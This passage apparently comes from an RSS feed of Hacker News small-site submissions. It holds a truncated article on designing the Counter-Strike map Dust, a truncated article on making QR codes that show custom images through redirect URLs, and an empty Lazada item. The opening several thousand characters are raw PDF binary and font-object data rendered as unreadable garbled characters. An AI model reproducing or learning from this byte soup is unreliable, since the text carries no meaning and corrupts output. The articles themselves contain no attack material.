�l, ‚b´ˆþ5¯P‡mKEÀ6ob|g[ÚÛ |Ÿûò›Ý²¸<q­zûm9`Ãìp„. zº•×Å¤ Ïü="" aœÐžÔbøÎtß ,yË\¼tÚj�œ×bé="" ”inœú="" a¿p ¹k\²ÜŸÙÞŽ(øŠ£—Œ¼ d°¢Û§mˆkr="" è€0´´�–5º¸qð!aòeò­ÙŠ”�õén¶ßhÿ&g¹iŒox´�"ïýoÒÌrgß5Ãhóçpðp="" @Š'àÂà;Êqa•&ž="" åy÷¶ý:Ô|nk6\ru@Ç›±åbg´ÿ="" ëh±�="”Ò‰zqËÚ9€à!Ýýjý¢puŸ®ÔSL?Â“qmRB" Üê="" …vè@ñœË¤e‘:ukÎ¦„©–àßµ3[ªüåÎèbŠ«kÎbÚ§rÎØžôvÃä“­s8@Ù�óû*nnªåil¥dpÂÍÀ(xœÜ!eÀì*sq$qgi39ƒ„ÀºÃÅiëãŒ"[*Ý” �Êd·+¬ÄaŠnË@¸«m·;øiÜøìŸyÐa–w�qòÀïýš×Û²mpµ�®„vmëdsj'$‚usÆ§+8¹gc*e"$ÑÈa€l_)¢="" �Ìc?93õâ´ŒÙ[uõ¡Ï¹Ï#åd©$`w.í"çz|-õ…‡)(6?¡_…eò±ov~ÈÙä•#6lö´¿yor«.-t™¸5œ|ëÉw[fº2_¤="" •`jxÖipû¹€íÊâ7”¿‰†î¼”eÿxŒ­ðÈ="" ª~.€äªÊøº�-�»'9c%‹Ú(Æ®?×¥{Ê‘d'¤Ó“Í="ÝièØgcÓ-ÓhÆ™Œ#9<5µnèDXÊ|óDTY®²Äî8_h·�)ç" úŽégfbÅ¶só4à\+Ë¹¸0k´h¹b3¿Ÿ^yu="" )cÛ÷xzÜn’eÁÂÁ[~d¶hš¬uâÌ±b´z="éqð6Y" ¤’ÙÙ"e.¥ˆæaÏÁb|="">=£;Ã¡ôGêzFQIøàÞ&lt;âå‚‹–±’Z¬gòµ?»’3×²‹H:Êm¥b–Ìóö^#©ð�@¡–û–mg¨–;Ž–‰^f\‹lù&lt;­t{x1v\î\‡‘TX2L-˜KÔâ0bö"$PÑÀ«¨ð)gq'¬’uÔÒï‚)!ãRÞ“„÷ºìK&amp;uv)Çhß•C¹–å3•�”¿Y§2ÿ+4y)ýùÆ'u¦áA—f0DXN€µØ·)—ø18zGÄ%‘æ'
§_°â»˜Ywg™ˆæïB$œ"²:ë–,¤€èÅg
„`VH”¾ÖÞA[s°��³¸ä5™j¤”�|z‡
‚$Î™úP»±»á&amp;‰)ØÉk~‰áP‡Ñ´½sÜUæRèÈö,?üœÒ¢®Ä0;²ðÍ$îXöøšNÈœƒEOÅ`bfÜË{Îb*
«4r‡†&lt;æô¨ˆ¹e*]I&gt;Ð{{4¦ÍŽ¼°Œ®¥ÇV3û~Z½Kk¼¶·ãÜ“Ì²¯�é:ëÖ^§ƒ!!F$tõS/Øi•&nbsp;
ÃÎãs²HÞÒÈo#¢ï/òQA™7Ðë0.Ü§ä–}s¹ãY´A*­¹RAKafÛ„ê¡}êIöÚµ¾ºGL’áÀ‚¥n ÔQH¯»¬×ºHì‘tRb¨Ò™µË;ÜewÓõùÝ�DT¤M.Ž­C s9R7|h ^q�ÀÚ	dm«æ8rƒ|=Ñ«'Š/Ó°Û‰¶¹g‹ÊsîêZPÏò9Òn'wÂM\&lt;~N˜º·Ï‰=é¸"Ìq&amp;Þ0øoAãÒŸü˜`å¼b<jÌšú.ö·‚b&-ÁëôtŠykÑ|ûå×�û gÆìèvwqihëa'kÙtgráüûá="²u¤ÒïÝëì,3&nbsp;•ÂÑ¥é](u�®ÊU\ZÊÎÅS5—6F" ßÊÛc½­·Ç�à(xi?àjïŽÿºxû¡îx±1$�½¼a´—g)k¬Âõv;1“[´¤’Ä="" ‰ö="" Åªzq%p\§Ø¾jÎz]*�pø|‚w¡˜Êd="„N³‘" Ðae{¹v.Û–6µz¿¥�¿¿Çc!®="" r‡sÇ¤j2�¥�‘&ç¶öµei§¹šuù@ï?æØ,#”Ö|ósùÁÙ»8—®Ãª\‰sy¢r¡zó'–myÒ="" cjc³ú`1ty;þÓ®mÊÛë+üóljÛæag7†?×¸¢?ˆ="" µºÚwcpc°uÂ²^ë¥ÇÜ¬ªÁ2gÈŒÀ£Ôr="" ÜÃÏ[Éÿ4ä³Þ0÷]ÉÔÐòŒ&Å’íe®="" ãçæÔ–Õ¹•óøÍöÖ¾Þä<·îjcøl˜Ý05…z@í«6£Ökd(ÿayl!"xô­­`Í…Ñ-|§\qÉt‡…,¸f‰“Óu-}û—é3¶nl°dÍbè+‘@i$="">�tÌï˜‹‹)Œ¿ýÎ|ù
¡½QñX­_Ð=¼ä
@…³D`oàõc|»&nbsp;ûæöÍ›[V|ÿ#
‘ÁÉV±¢vÛˆ¿ðß³iÓ×Ïž=›ˆBß¶=ŸgC9ÙØdF¹$EÓÈËb~bhŠ)•.RºaØ!�ÌI6˜NÆöpjý8háES�	:çKò¬ö9�²]©—4	Â¢˜ZutúÆÈ£J�MA°[üÕ©V�_æiÆX&nbsp;ÖÃU¤½-%“:Å„¦�·ÛŸÂušNíœÔúÝ�êyëÑÐVÜ¹åN]Ë{v#Î¢Y±{�(PL½ó6�­ôBAGBc¡C·§t”d³ŠÍß&nbsp;È;°šï½–&gt;È_&nbsp;¬‡‘�I[[Ç½�Fe#zX./³<u:¿šwk³¯šÆvÐ{yªÈgð¡ó>U™Ë§Ñ%˜Û† o„"Vœ¶)v{Ó»’vï’Ö¶¶%¿+&amp;š8ç)'ŒØË!6ŽîGKé–'kÍgø“kM
Xª‚Rmí°PõUe¶õ«; 5ÀY¾€BÄ(˜Ì&lt;1@ˆîÚNnv‰§By_Š÷ÔešÐ‹•’êRöF——Ig9Ïé`FÉ6m
ÓÉituÅYâÖ³ ŒÙöI§÷ÐWz:‘¶‡Ã¾íáfêC³¯ú¶Á•­EGoq´7�/\¯Ü‡l,Ó˜‘¬ä(ôáï�ÿ`ÖW©#
endstream
endobj
25 0 obj
&lt;&lt; 
/Type /Font 
/Subtype /Type1 
/FirstChar 1 
/LastChar 19 
/Widths [ 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 525 
525 525 ] 
/Encoding 49 0 R 
/BaseFont /CEDOBL+CMTT10 
/FontDescriptor 33 0 R 
/ToUnicode 50 0 R 
&gt;&gt; 
endobj
26 0 obj
&lt;&lt; 
/Type /Font 
/Subtype /Type1 
/Encoding /WinAnsiEncoding 
/BaseFont /Helvetica 
&gt;&gt; 
endobj
27 0 obj
&lt;&lt; 
/Type /Font 
/Subtype /Type1 
/FirstChar 1 
/LastChar 11 
/Widths [ 358 897 511 511 307 307 486 664 511 511 332 ] 
/Encoding 51 0 R 
/BaseFont /CEEBEP+CMTI10 
/FontDescriptor 35 0 R 
/ToUnicode 52 0 R 
&gt;&gt; 
endobj
28 0 obj
&lt;&lt; 
/Type /Font 
/Subtype /Type1 
/FirstChar 1 
/LastChar 6 
/Widths [ 378 989 613 591 602 636 ] 
/Encoding 53 0 R 
/BaseFont /CEECOC+CMCSC10 
/FontDescriptor 37 0 R 
/ToUnicode 54 0 R 
&gt;&gt; 
endobj
29 0 obj
&lt;&lt; 
/Type /Font 
/Subtype /Type1 
/FirstChar 1 
/LastChar 73 
/Widths [ 333 917 528 444 500 833 556 556 389 278 556 500 444 528 392 556 500 
394 556 528 556 278 500 500 500 500 278 722 333 528 306 278 361 
278 556 708 500 500 750 389 389 653 750 583 528 736 278 500 500 
278 1000 778 500 722 750 722 500 500 611 681 500 556 444 625 556 
306 764 785 278 1028 750 681 514 ] 
/Encoding 55 0 R 
/BaseFont …</u:¿šwk³¯šævð{yªègð¡ó></jìšú.ö·‚b&-áëôtšykñ|ûå×�û></q­zûm9`ãìp„.></iðâ°r½äx•¡èjq-ãã1c�à\ùk8ùcãn></a ç1™:#l9kû¶nèrƒtþ!íj’‹¾á`b²¹"ä›§g«ê‹…°n÷z?&9ù“></c¾›¬�lïìz{p«°w%></aÿzõ×ýeeã8ž¤n8ˆò2å)"ñ…<úx¤�à™"o—�ì†jzâ™«e@dýˆ`våå�5üf‚?joøçµ„dîüñäã></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.davidsalomon.name/assem.advertis/asl.pdf">http://www.davidsalomon.name/assem.advertis/asl.pdf</a></em></p>]]>
            </description>
            <link>http://www.davidsalomon.name/assem.advertis/asl.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25703581</guid>
            <pubDate>Sat, 09 Jan 2021 19:18:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What is happening to Lazada is happening to all companies acquired by Alibaba]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 30 (<a href="https://news.ycombinator.com/item?id=25703505">thread link</a>) | @7d7n
<br/>
January 9, 2021 | https://thelowdown.momentum.asia/what-is-happening-to-lazada-is-happening-to-all-companies-acquired-by-alibaba/ | <a href="https://web.archive.org/web/*/https://thelowdown.momentum.asia/what-is-happening-to-lazada-is-happening-to-all-companies-acquired-by-alibaba/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://thelowdown.momentum.asia/what-is-happening-to-lazada-is-happening-to-all-companies-acquired-by-alibaba/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25703505</guid>
            <pubDate>Sat, 09 Jan 2021 19:12:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Making of Counterstrike's Dust]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25703171">thread link</a>) | @sillysaurusx
<br/>
January 9, 2021 | https://www.johnsto.co.uk/design/making-dust/ | <a href="https://web.archive.org/web/*/https://www.johnsto.co.uk/design/making-dust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
		

<p>For many FPS players Dust - and the later Dust 2 - are the quintessential Counter-Strike maps. They’ve been featured in nearly every major Counter-Strike tournament, and been responsible for countless millions virtual deaths, bomb detonations and defusals. But these maps actually owe their existence to Team Fortress 2 - a game that was released eight years <em>after</em> Dust became a staple of the Counter-Strike map rotation.</p>

<h2 id="time-travelling">Time Travelling</h2>

<p>It started in the summer of 1999, Suffolk, England. I was 16 years old, recuperating from end-of-year exams and enjoying my newfound freedom from school work. Half-Life was only a few months old, yet was scooping up more ‘Game of the Year’ awards than there were game magazines, leaving gamers desperate to know what Valve Software were going to make next.</p>

<p>Thankfully, news broke that Valve had hired the team behind ‘Team Fortress’, a free mod for Quake that added class-based team multiplayer to the game. Like any responsible teenager, I’d spent more hours sat staring into a screen zooming around dodging rockets, slinging grenades and capturing the flag than I had with my head stuck in schoolwork, much to the chagrin of my parents. Their next project? A sequel, excitingly titled ‘Team Fortress 2’.</p>

<p>It seemed that whilst I had been busy ambushing my future educational prospects, behind closed doors Valve had been hammering away at updating and upgrading Team Fortress for a new generation of hardware. News of Team Fortress 2 was rare and sporadic, but occasionally a tidbit here or a screenshot there would nervously peer out to an excited but nervous audience of TF fans.</p>

<p>Before too long, a <a href="http://wiki.teamfortress.com/wiki/Promotional_images">handful of screenshots</a> started their steady journey around the gaming websites of the late nineties. Two particular screenshots leapt out at me:</p>

<figure>
	<div><p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/tf2_01.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/tf2_01_thumb.jpg" alt="Team Fortress 2"></a></span></p>

<p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/tf2_02.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/tf2_02_thumb.jpg" alt="Team Fortress 2"></a></span></p>
</div>
	<figcaption>Two early screenshots of Team Fortress 2.</figcaption>
</figure>


<p>The seed had been sown.</p>

<p>Meanwhile, a new Half-Life modification known as ‘Counter-Strike’ had been picking up a steady stream of players. In the autumn of 1999, Minh ‘gooseman’ Le and Jess Cliffe released its second beta - and it supplanted Team Fortress to become my new addiction. It came with a texture pack of urban textures (‘cstrike.wad’) that, upon discovery, I set about making a map with - this became ‘<a href="https://www.johnsto.co.uk/blog/a-little-wad-the-story-of-cs_tire/">cs_tire</a>’, a hostage rescue map set in (of all places) a retirement home. Surprisingly, this map was deemed good enough to be included in the third beta release of Counter-Strike, and Jess subsequently asked me if I’d be interested in making a map for the fourth beta. He was very keen to hook me up with their texture artist to help me make something absolutely and completely original.</p>

<p>Jess introduced me to artist Chris ‘MacMan’ Ashton - the same artist behind the urban texture set used in my retirement home map - and we got to work creating a new, totally original Counter-Strike map. Unfortunately it was too late to save me from TF2’s influence and I asked for these instead:</p>

<figure>
	<p><span><img src="https://www.johnsto.co.uk/i/design/making-dust/tf2-textures.jpg" alt="Team Fortress 2 texture selection"></span></p>
	<figcaption>Team Fortress 2 screenshots were used to create a core texture set</figcaption>
</figure>


<p>Undeterred by my complete lack of originality, Chris quickly got back to me with beautiful lookalikes. While not exact replicas, I selfishly became completely infatuated with them, just like I had the screenshots they were based on . I quickly bundled them all together into my own texture pack and called it “cs_dest.wad” - shorthand for “Destiny”.</p>

<p>With these TF2-alike textures I could finally make a map and pretend I was playing Team Fortress 2, but something was wrong. I felt guilt - TF2 wasn’t even out yet and I was already trying to sap all the effort Valve had been putting into it. It was akin to snatching a duckling from under its mothers beak. “But surely”, I thought, “Valve wouldn’t mind one me making one small map for one small mod for their one and only published game? A map that maybe only a handful of people would ever play?”</p>

<p>I marched on.</p>

<h2 id="copy-and-paste">Copy and Paste</h2>

<p>Starting the map was the easy bit - the first area boasted a long road flanked by buildings, leading to an archway and a wall dividing it in two, just like I’d seen in the screenshots. I decorated every building and wall with ornate trims along the top or bottom, again aping TF2, as I tried my hardest to evoke the same sense of place, desolation, and scale. These features would go on to define the underlying architectural style of Dust.</p>

<p>My effort wasn’t <em>quite</em> identical to the map featured in those coveted TF2 screenshots, but it was close enough, and - somewhat more importantly - it was a start.</p>

<p>The arched doorways became a hallmark of the Dust theme - a Dust map is simply not Dust without at least two or three arches dividing the map into distinct zones. Creating the first one was at the time a great test of my technical mapping ability, and I struggled for a little while before landing on a technique that worked. My design eschewed the Reuleaux triangle shape of the TF2 arches for a simpler semi-circle, partly because it was simpler, but primarily to ease player passage through them. I extruded the arches from their adjoining wall - lifted straight from the screenshots.</p>

<figure>
	<div><p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/start_01.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/start_01_thumb.jpg" alt="Early CT spawn area"></a></span></p>

<p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/start_02.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/start_02_thumb.jpg" alt="Early CT spawn area"></a></span></p>
</div>
	<figcaption>The first  incarnation of what became the CT spawn</figcaption>
</figure>


<p>I considered against copying the screenshots verbatim for fear of upsetting Valve, and so started guessing how the rest of the area should look. I’d already created a raised platform, and had decided that this could be the area that the Counter-Terrorist team would spawn in at the start of the match. This necessitated defensive measures to protect their spawn area, so I made some windows:</p>

<figure>
	<div><p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/early_windows_01.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/early_windows_01_thumb.jpg" alt="Early CT spawn area"></a></span></p>

<p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/early_windows_02.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/early_windows_02_thumb.jpg" alt="Early CT spawn area"></a></span></p>
</div>
	<figcaption>The view from inside a building next to the CT spawn</figcaption>
</figure>


<p>Not only did they look hideous, but the windows didn’t give the defensively-advantageous views I wanted the CT team to have. Nor did they fit with the intended gameplay. I didn’t want to encourage the CTs to hold back, and removed them - although in all honestly, at this point I really didn’t know where the map was going.</p>

<h2 id="under-the-influence">Under the Influence</h2>

<p>Side-by-side, the TF2 ‘influence’ is plain to see:</p>

<figure>
	<div><p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/tf2_01.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/tf2_01_thumb.jpg" alt="Early CT spawn area"></a></span></p>

<p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/tf2compare_01.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/tf2compare_01_thumb.jpg" alt="Early CT spawn area"></a></span></p>
</div>
	<figcaption>Side-by-side, the influence of TF2 on the design of the CT spawn area is apparent.</figcaption>
</figure>


<figure>
	<div><p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/tf2_02.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/tf2_02_thumb.jpg" alt="Early CT spawn area"></a></span></p>

<p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/tf2compare_02.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/tf2compare_02_thumb.jpg" alt="Early CT spawn area"></a></span></p>
</div>
	<figcaption>TF directly influenced building placement and the design of the arches.</figcaption>
</figure>


<p>In many respects, the TF2 screenshot looks nicer to me - smoother and softer than the harsh edges of the Dust buildings. I was far more comfortable working with standard geometric shapes, 90 degree corners and 45 degree angles, which is why Dust looks far boxier in comparison to the TF2 screenshot it was based on.</p>

<p>That was the easy part done - after all, Valve had already created this much of the map for me and all I’d had to do was copy it. But what I had wasn’t much - it was barely enough for a one-on-one deathmatch, let alone two teams of eight players gunning it out. Worse still, there were no more screenshots to use for ‘inspiration’ - I had to make the rest of the map off my own back and imagination.</p>



<p>Having nailed down the design of the first area, producing the rest of the map was merely a case of extrapolating it into a complete, playable environment. However this was much easier said than done - the next section of the map proved rather more challenging.</p>

<p>I had created a T-junction out of the CT spawn, but struggled to know what to do with it. My past mapping experience was mostly creating tight interiors rather than not vast exteriors, and so I was feeling very lost. Desperate, I shoe-horned a bend in the road leading to a downward slope, and at the end of it - an underground cavern.</p>

<figure>
	<div><p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/underground_01.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/underground_01_thumb.jpg" alt="An underground chamber"></a></span></p>

<p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/underground_02.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/underground_02_thumb.jpg" alt="An underground chamber"></a></span></p>
</div>
	<figcaption>The underpass originally descended into a vast underground facility, but this was scrapped the moment I played it.</figcaption>
</figure>


<p>It didn’t work, of course. While the CT spawn area was light and airy, this giant room was gloomy, boxy and felt dead compared to the sunny exterior I’d already made. Observing it also lacked any gameplay potential, I swiftly deleted it. Dust would be an outdoor map.</p>

<p>I was still stuck. It’s at times like these where working without an initial design can prove extremely difficult. You look at what you’ve got, and struggle to see where to take it, knowing that a step in one direction is a step away from a solution in another direction - and you don’t know which will turn out better. It can be very tough and incredibly tempting to just scrap  <em>everything</em> and start again. I’d made all my previous maps one room at a time, making it up as I go along with precious little pre-planning, and they had gone reasonably well. I had to hope I could do the same again.</p>

<p>Mercifully, that’s exactly what happened.</p>

<figure>
	<div><p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/tspawn.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/tspawn_thumb.jpg" alt="Terrorist spawn"></a></span></p>

<p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/underpass.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/underpass_thumb.jpg" alt="Underpass"></a></span></p>
</div>
	<figcaption>The Terrorist spawn area, and shallow decline into the underpass.</figcaption>
</figure>


<p>Within just a few hours - and seemingly out of nowhere - the Terrorist spawn area was complete. I was far happier with this side of the map, perhaps a product of becoming comfortable with the visual and architectural style. The shallow decline into the underpass is perhaps one of my favourite aspects, both aesthetically and as a player who spent many hours armed with a Steyr Scout at the crest popping off opponents’ heads.</p>

<p>At one point I planned an alleyway from the Terrorist side of the underpass that fed around to the CT ‘sniper nest’, but this path seemed like it would be too long, too linear, and simply too <em>dull</em>. I just blocked it up with crates instead, still visible in the original version of the map (and the screenshot above.)</p>

<p>Dust’s central hallway was pivotal in tying all these pieces together. Unfortunately, I can recollect very little about its creation, bar my explicit efforts to ensure players couldn’t see all the way through it from one end to the other. Every crate found in the intersection was strategically positioned to cut off lines-of-sight and improve performance. It was in this corridor that each team would typically meet, and so it needed to be fair, and balanced, with a slight defensive bias.</p>

<figure>
	<p><span><a href="https://www.johnsto.co.uk/i/design/making-dust/corridor.jpg"><img src="https://www.johnsto.co.uk/i/design/making-dust/corridor_thumb.jpg" alt="A screenshot of the central corridor"></a></span></p>
	<figcaption>The central corridor, Terrorists approached from the top, Counter-Terrorists from the bottom. Note the stack …</figcaption></figure></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.johnsto.co.uk/design/making-dust/">https://www.johnsto.co.uk/design/making-dust/</a></em></p>]]>
            </description>
            <link>https://www.johnsto.co.uk/design/making-dust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25703171</guid>
            <pubDate>Sat, 09 Jan 2021 18:44:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking QR code design – Creating QR codes that look like anything]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25703083">thread link</a>) | @whack
<br/>
January 9, 2021 | https://marienraat.nl/hacking-qr-codes.html | <a href="https://web.archive.org/web/*/https://marienraat.nl/hacking-qr-codes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <div>
      <div>
        <div>
          <p><b>Check out <a href="https://my-qr.art/">My-QR.art</a> for the final result!</b></p>

          <p>QR codes provide a clear and approachable way of translating the physical world to the
          digital world. When I see a QR code, I always want to scan it to find out what is behind
          it, somehow they always fascinate me. But QR codes always look very similar, could there
          be a way to make them look more cool? Make them a certain specific shape or contain pixel
          art?</p>

          <p>People already (ab)use the error correction build into QR codes to embed their logo
          in it, they simply put their logo over a part of the QR code and let the error correction
          handle the missing data. However, you can never obscure more than 30% of the code (and
          usually a lot less) if you choose this approach. But QR codes are mostly a visualisation
          of data. Can we approach the problem from the other side? What if we don't try to
          design a QR code to fit the data, but fit the data to the design of the QR code that we
          want.</p>

          <p>Spoiler, we can. Check out <a href="https://my-qr.art/">My-QR.art</a>. All the code is
          totally free and open source, so feel free to
          contribute <a href="https://github.com/raatmarien/my-qr.art">on GitHub</a></p>

          <h2 id="the-idea">The idea</h2>

          <p>Say, we want to promote our website. And we have a nice grayscale logo. Now we want to
          have an engaging QR code that looks like our logo.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/my-qr.art-logo.svg" alt="My-QR.art logo"></p><p>And we have an URL that we want the QR code to lead us too, for
            example: <a href="https://my-qr.art/">https://my-qr.art</a>.</p>
          
          <p>We set up a web server that can redirect certain URLs to other URLs. Then we can make
          the beginning of the data of our QR code the URL to that web-server and the rest of the
          QR's data can be anything. So we can choose the rest of the data in any way that makes
          our QR code look most like our design!</p>

          <p>For example the QR code could send you
            to <code>https://my-qr.art/r/arbitrary-super-long-string</code>. On the back-end we tell
            the server to redirect any request with the
            URL <code>https://my-qr.art/r/arbitrary-super-long-string</code>
            to <code>https://my-qr.art</code>. And tada! We have a functional QR code that sends us to
            the address we want, while having way more control over how the QR code looks! Up to 80%
            of the code can be freely designed this way!</p>

          <p>When we have this all working, we could even make nice scannable QR gifs. We could make
          each frame separately and let them all redirect to the same page. I admit, most QR codes
          are printed, so gifs might not make the most sense, but they look pretty cool! To keep you
          excited for the rest of the article, here is world's first ever working QR gif (as far
          as I know)!</p>
          
          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr.gif" alt="Animated QR code that shows a running horse"></p><p><a href="https://en.wikipedia.org/wiki/The_Horse_in_Motion">The running horse might
          remind you of some other movie...</a></p>

          <h2 id="qr-codes">How does QR work?</h2>

          <p>Now that we know the concept, lets get started. First we need to know how QR codes
          actually work.</p>

          <p>QR codes encode data by making some blocks dark and other light. The QR scanner can
          then read which are dark and which are light and reconstruct the original data. QR codes
          can have 40 different sizes, from <em>version 1</em> (very small, 17x17) to <em>version
          40</em> (very big, 177x177). QR codes are made of black and white 'modules' and
          each module has one of the following 4 functions:</p>

          <ol>
            <li>Help the scanner recognise and orient the QR code</li>
            <li>Give information about the QR code size, type and other internal QR stuff</li>
            <li>Encode the actual data that the QR code represents</li>
            <li>Encode error correction info about the QR code</li>
          </ol>

          <h2 id="drawing">Creating a template</h2>

          <p>Our plan is to allow the user to choose the colour of any module that has function 3. So
          the first step is to let the user know which pixels they can control and which pixels they
          can't control for the QR code size they chose. For now lets try to create an image on
          which the modules with function 3 are coloured white and all other modules are coloured
          grey.</p>

          <p>For this we can colour all the modules and error data. To get this right you really need
          to dive into how QR codes work. We need to think about the data encoding, interleaving,
          extra eyes, error words and more. We'll also need to take into account that we'll
          need to reserve first few characters of our data for the start of our URL. Luckily there
          is a great source on QR codes on the
          internet, <a href="https://www.thonky.com/qr-code-tutorial/introduction">the QR code
          tutorial from Thonky.com</a>. Putting the work in, we get something like this, for version
          30.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-template.png" alt="A template for a QR design"></p><h2 id="reading">Reading a design</h2>

          <p>Now let's work on the other side of the puzzle, when we have a design that a user
          has drawn on our template, how do we convert it to a working QR code? QR codes have 4
          possible types of encoding: <em>numeric</em>, <em>alphanumeric</em>, <em>binary</em>
          and <em>kanji</em>. We need something that we can create valid URLs with, so numeric and
          kanji are out. Secondly, we need the random string at the end of our URL to
          be <em>normal</em> enough so that QR scanners will still recognise our code as an
          URL. The <em>binary</em> encoding will create characters that aren't ordinarily found
          in URLs ('\0' for example), which means lots of QR scanners won't let their
          users open our URL. Luckily the <em>alphanumeric</em> encoding has just enough characters
          to let us make valid URLs (although they'll have to be all caps).</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-design.png" alt="A design for a QR code that contains the My-QR.art logo">

          <img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/qr-data-order.png" title="Made by Thonky, shared under the CC ANC 4.0" alt="An illustration from Thonky.com that shows how data is encoded in a QR code"></p><p>So with that figured out, lets read that design the user made. First we'll extract
          a bit string from all the data modules in the design. For small QR codes this is quite
          straight forward, the QR code is simply read from right to left, bottom to top and back
          again in double columns, see the illustration from Thonky above. However, when the QR code
          size passes 5, we'll have to take into account interleaving. Then the data words are
          scattered around the QR code, presumably to make the data pattern more random. So
          we'll have to reverse that interleaving procedure. Luckily how it works is explained
          by <a href="https://www.thonky.com/qr-code-tutorial/error-correction-coding">Thonky.com</a>. At
          last we get a bit string from our design, here we only show the first 80 character, the
          real bit string for this design is 13863 bits long.</p>
          <p><code>01100011010101001100101010001100011110111010100000000001110100111110011101001001</code></p>

          <h3 id="decoding">Decoding the bitstring</h3>
          <p>Now we'll need to decode the bits to an alphanumeric string. Here we group 11 bits
          together every time and then convert that into two alphanumeric characters
          using <a href="https://www.thonky.com/qr-code-tutorial/alphanumeric-table">this
          table</a>. We get the following data string (again truncated).</p>

          <p><code>KS$#LKAHRDF9H8XQI9AL HRD$OIWHSRE94QX95IFR*IK9HF/ 5NM+/AMIA99LB I5R II98ULR JRD/AR1 IRG8...</code></p>

          <p>We'll just replace the first 20 characters with our URL prefix and we get:</p>

          <p><code>HTTPS://MY-QR.ART/R/ HRD$OIWHSRE94QX95IFR*IK9HF/ 5NM+/AMIA99LB I5R II98ULR JRD/AR1 IRG8...</code></p>

          <h3 id="qr-code">Generating the QR code</h3>

          <p>Now we can use any QR library to create the QR code! The QR library will handle adding
          all the difficult error codes and other boring stuff for us.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/failed-qr.png" alt="A random looking QR code"></p><p>But what is that? Why does it still look all random? The problem is masking. The QR
          code spec includes 5 different masks and the mask that makes the QR code look most random
          is chosen, which is almost certainly not our design. This is done to make the code easier
          to read for scanners. However, in my experience, QR codes scan just fine with more
          structured data. So we don't have to feel too bad about modifying our QR library to
          always use the same mask. Then after we apply the same mask to our design before
          processing it, we finally get the desired image.</p>

          <p><img src="https://marienraat.nl/assets/img/blog/hacking-qr-codes/my-qr.art-qr.png" alt="A QR code with the design in it"></p><h2 id="redirecting">Redirecting the request</h2>

          <p>Now to redirect the QR code to the right domain. This should be easy, put the QR URL in
          a database and link it to the redirect URL. When we receive a request, simply look up the
          corresponding URL in a database. However, if we want to use a modern web server, we'll
          have to jump through some hoops... Apache doesn't like most of our URLs, since they
          are technically malformed (ugh, spoil the fun much Apache?). So it throws an <em>Error
          400: Bad request</em>. We can't disable this error anywhere it seems. However, luckily
          there is a workaround, we can set a custom error page for our <em>Error 400</em>, so if we
          just set the redirect page as the error page for <em>Error 400</em>, we are home free!
          Luckily Apache is not so much of a spoilsport that it throws a Bad Request error while
          trying to handle a Bad Request...</p>

          <p>For the back-end I've been using Django, and it has another fun bug that shows up
          with these really weird URLs. It tries to decode the URL as an ISO-8859-1 string, but some
          of the characters passed by Apache aren't in ISO-8859-1. So we have to derive our own
          WSGI handler to workaround
          this, <a href="https://github.com/raatmarien/my-qr.art/blob/main/my_qr_art/custom_wsgi.py">see
          here</a>. But now it works, try to scan the QR we made, it redirects where we want it to
            redirect!</p>

          <p>One small caveat though, QR codes themselves are standardized and we create standard
          compliant QR codes with correct URLs in them, but QR scanners aren't standardized and some
          might not recognize our code as a URL and will see it as plain text instead.</p>

          <h2 id="a-web-app">Custom QR codes for everyone!</h2>

          <p>Just outputting and parsing images isn't very user friendly, so I made a nice web
          app at <a href="https://my-qr.art/">My-QR.art</a> using Django. It
          has <a href="https://my-qr.art/editor">a friendly editor</a> where you can draw, fill or
          upload black and white images to make your QR code. It also has some …</p></div></div></div></article></div>
